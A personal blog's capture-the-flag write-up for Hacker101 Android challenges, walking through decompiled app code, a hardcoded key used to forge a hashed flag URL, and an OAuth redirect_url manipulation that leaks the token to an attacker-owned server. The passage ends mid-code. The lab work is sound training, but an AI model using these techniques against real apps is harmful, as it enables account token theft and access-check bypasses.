<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Hackerone Android Challenges Writeups" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev)." /><meta property="og:description" content="Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev)." /><link rel="canonical" href="https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/" /><meta property="og:url" content="https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-07T16:40:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackerone Android Challenges Writeups" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-07T14:02:05+02:00","datePublished":"2022-03-07T16:40:00+02:00","description":"Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev).","headline":"Hackerone Android Challenges Writeups","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/"},"url":"https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/"}</script><title>Hackerone Android Challenges Writeups | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackerone Android Challenges Writeups</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackerone Android Challenges Writeups</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Mar 7, 2022, 4:40 PM +0200" prep="on" > Mar 7, 2022 <i class="unloaded">2022-03-07T16:40:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 2:02 PM +0200" prefix="Updated " > Apr 7 <i class="unloaded">2025-04-07T14:02:05+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2808 words">15 min</span></div></div><div class="post-content"><p>Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev).</p><p><strong>Difficulty:</strong> Easy and moderate</p><p><strong>Challenge Link:</strong> https://ctf.hacker101.com/ctf</p><h2 id="thermostat">Thermostat</h2><p>Let’s start by downloading the provided APK. and then install it in our emulator I am using Android Studio with Nexus 5 API 29. opening the application we find the following: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F2lxlBIt3u0VvxPx78ahi%2F1-App.png?alt=media&amp;token=5d933176-1904-4543-8e20-a11d5abc7943" alt="" /></p><p>hmm! nothing to be interesting and only a plus and mins button to reduce the temperature. maybe there are some hidden requests. So we need to inspect the traffic through our proxy I will be using burp suite. the following will help to Configuring your Android to Work With Burp: <a href="https://www.youtube.com/watch?v=lq4wprdLpbo">https://www.youtube.com/watch?v=lq4wprdLpbo</a> I configured burp and run the program and the first request was congaing the first flag: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F3QOH0xKB7Bl1vHQukHea%2F1-1_flag.png?alt=media&amp;token=b018029d-3beb-4b7a-9c38-2338bfeaeb86" alt="" /> I looked for other requests to find the second flag but I found nothing. One of the hints were saying <code class="language-plaintext highlighter-rouge">Access to the source code would help</code>. Nice Let’s pass our APK file to <a href="https://github.com/skylot/jadx">JADx-GUI</a> which is an application helps you to decompile and reverse APKs file to read the source code. By looking through the source code I found the following function which contains the first and second flag. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F6UsG6SLjd70o31A0EJrL%2F1-2_flag.png?alt=media&amp;token=8965f489-2d01-4fca-a2a8-9a7819851616" alt="" /></p><h2 id="intentional-exercise">Intentional <strong>Exercise</strong></h2><p>First, Let’s download and install the APK in our emulator. Once, we open the application the following request will be made from the application request: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F6Yg8SYoCVjCEu6jRnetj%2F2-burp-request.png?alt=media&amp;token=075df2d2-ee66-4201-96fb-388cc8ffbc8c" alt="" /> But after clicking the flag link it returns an invalid request. Let’s examine the source code using jadx-gui to see what is happening: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FU0QKGHKsFyqTteuA9bVq%2F2-code.png?alt=media&amp;token=bebe230f-611a-458d-a099-eca3491a5e95" alt="" /> After examining the source code it is very important to track the value of each variable to be able to form the correct URL and retrieve the flag.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> <span class="nc">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getData</span><span class="o">();</span> <span class="c1">// data = retrive the application URI</span>
 <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="s">"http://35.227.24.107/2b8b8cfd16/appRoot"</span><span class="o">;</span>
 <span class="nc">String</span> <span class="n">str2</span> <span class="o">=</span> <span class="nc">BuildConfig</span><span class="o">.</span><span class="na">FLAVOR</span><span class="o">;</span>  <span class="c1">// str = ""</span>
<span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
  <span class="n">str2</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">28</span><span class="o">);</span>  <span class="c1">// truncate the first 28 character from the URI</span>
  <span class="n">str</span> <span class="o">=</span> <span class="n">str</span> <span class="o">+</span> <span class="n">str2</span><span class="o">;</span> <span class="c1">// if data = "http://35.227.24.107/2b8b8cfd16/appRoot/flagBearer"</span>
                    <span class="c1">// So str2 = "/flagBearer"</span>
                    <span class="c1">// str = "http://35.227.24.107/2b8b8cfd16/appRoot/flagBearer"</span>
<span class="o">}</span>              
<span class="k">if</span> <span class="o">(!</span><span class="n">str</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"?"</span><span class="o">))</span> <span class="o">{</span>
  <span class="n">str</span> <span class="o">=</span> <span class="n">str</span> <span class="o">+</span> <span class="s">"?"</span><span class="o">;</span> <span class="c1">// appeand ? to the str Value</span>
<span class="o">}</span>
<span class="k">try</span> <span class="o">{</span>
  <span class="nc">MessageDigest</span> <span class="n">instance</span> <span class="o">=</span> <span class="nc">MessageDigest</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"SHA-256"</span><span class="o">);</span>
  <span class="n">instance</span><span class="o">.</span><span class="na">update</span><span class="o">(</span><span class="s">"s00p3rs3cr3tk3y"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">));</span> 
  <span class="n">instance</span><span class="o">.</span><span class="na">update</span><span class="o">(</span><span class="n">str2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">));</span> <span class="c1">// SHA256(s00p3rs3cr3tk3y + str2)</span>
  <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">str</span> <span class="o">+</span> <span class="s">"&amp;hash="</span> <span class="o">+</span> <span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"%064x"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">instance</span><span class="o">.</span><span class="na">digest</span><span class="o">())));</span>
<span class="o">}</span>
</pre></table></code></div></div><p>So the Full URL will be: http://35.227.24.107/2b8b8cfd16/appRoot/flagBearer?hash=SHA256(s00p3rs3cr3tk3y/flagBearer) We can use a <a href="https://emn178.github.io/online-tools/sha256.html">SHA256</a> online website to encrypt out string:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>s00p3rs3cr3tk3y/flagBearer == 8743a18df6861ced0b7d472b34278dc29abba81b3fa4cf836013426d6256bd5e
</pre></table></code></div></div><p>Let’s send the request: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FnR59jTkq7HtGrdvO79mj%2F2-flag.png?alt=media&amp;token=38ee426d-d1f6-46aa-b989-5aaf0678622f" alt="" /></p><h2 id="oauthbreaker">Oauthbreaker</h2><p>After doing the initial stuff as above let’s try to understand what the application is doing. First, you open the application and you see one button as the following:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F534KcIhKpLXfuiMGy1dC%2Fimage.png?alt=media&amp;token=84143e9a-d8db-4637-bb47-7ccf034ac897" alt="" /></p><p>When is button is clicked it redirects us to the web browser giving the us following:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FraQzGem4RftyT2BgVZD2%2Fimage.png?alt=media&amp;token=7e193b74-45d6-4d87-b884-88a813f2330f" alt="" /></p><p>Then click the hyper linked you will be redirected again to the application and returning an empty activity.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F4kVguDQzyzMyKAqr9xiu%2Fimage.png?alt=media&amp;token=d3b37430-1a9b-4428-b2f6-ecb48c00bb4f" alt="" /></p><p>Let’s look at the requests on burp suite: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F0jPPpEQb8OiSddJczaOM%2Fimage.png?alt=media&amp;token=9f56a3db-e7ef-4b00-8a53-7698043ce219" alt="" /></p><p>Then <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FJVrH83lFhdziZTgMgpkP%2Fimage.png?alt=media&amp;token=059956fe-b51d-4c0a-8996-93c82cfbfc77" alt="" /></p><p>a very common misconfiguration on OAuth protocol is the ability to manipulate the redirect_url value to redirect the Auth token to a server that you own let’s try it: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F3vKhU5GkZspq3jF0ceQD%2Fimage.png?alt=media&amp;token=cab91883-1399-43ef-8419-15df6a5658fc" alt="" /> Great we got the first flag! Let’s examine the application source code a bit deeper. In the AndroidManifiest.xml:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.hacker101.oauth.Browser"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">"oauth"</span> <span class="na">android:host=</span><span class="s">"final"</span> <span class="na">android:pathPrefix=</span><span class="s">"/"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.hacker101.oauth.MainActivity"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">"oauth"</span> <span class="na">android:host=</span><span class="s">"login"</span> <span class="na">android:pathPrefix=</span><span class="s">"/"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
</pre></table></code></div></div><p>We can see that we have two activities <code class="language-plaintext highlighter-rouge">MAIN</code> and <code class="language-plaintext highlighter-rouge">Browser</code> with two intent filters. Also it’s important to note that there is no the <code class="language-plaintext highlighter-rouge">exported=false</code> flag which mean that those activities can be accessed individually which is a BUG refer to the following URL for more info: <a href="https://hackerone.com/reports/328486">https://hackerone.com/reports/328486</a> By looking at the source code of the MainActivity.java we can understand why the first bug occurs.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="kd">implements</span> <span class="nc">View</span><span class="o">.</span><span class="na">OnClickListener</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">authRedirectUri</span><span class="o">;</span>
    <span class="nc">Button</span> <span class="n">button</span><span class="o">;</span>

    <span class="cm">/* JADX INFO: Access modifiers changed from: protected */</span>
    <span class="nd">@Override</span> <span class="c1">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
    <span class="nd">@RequiresApi</span><span class="o">(</span><span class="n">api</span> <span class="o">=</span> <span class="mi">19</span><span class="o">)</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">authRedirectUri</span> <span class="o">=</span> <span class="s">"oauth://final/"</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getData</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(!(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"redirect_uri"</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
                <span class="k">this</span><span class="o">.</span><span class="na">authRedirectUri</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"redirect_uri"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span>
        <span class="k">this</span><span class="o">.</span><span class="na">button</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">button</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">button</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span> <span class="c1">// android.view.View.OnClickListener</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">view</span><span class="o">.</span><span class="na">getId</span><span class="o">()</span> <span class="o">==</span> <span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">button</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">str</span> <span class="o">=</span> <span class="s">"http://35.227.24.107/307f6c07e3/oauth?redirect_url="</span> <span class="o">+</span> <span class="nc">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">authRedirectUri</span><span class="o">,</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">.</span><span class="na">toString</span><span class="o">())</span> <span class="o">+</span> <span class="s">"login&amp;response_type=token&amp;scope=all"</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">UnsupportedEncodingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"android.intent.action.VIEW"</span><span class="o">);</span>
            <span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">str</span><span class="o">));</span>
            <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></table></code></div></div><p>That is because the <code class="language-plaintext highlighter-rouge">redirect_url</code> value taken from the user it self as indicated at line 28. Moving to the <code class="language-plaintext highlighter-rouge">Browser</code> Activity and Looking further down in the source code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_browser</span><span class="o">);</span>
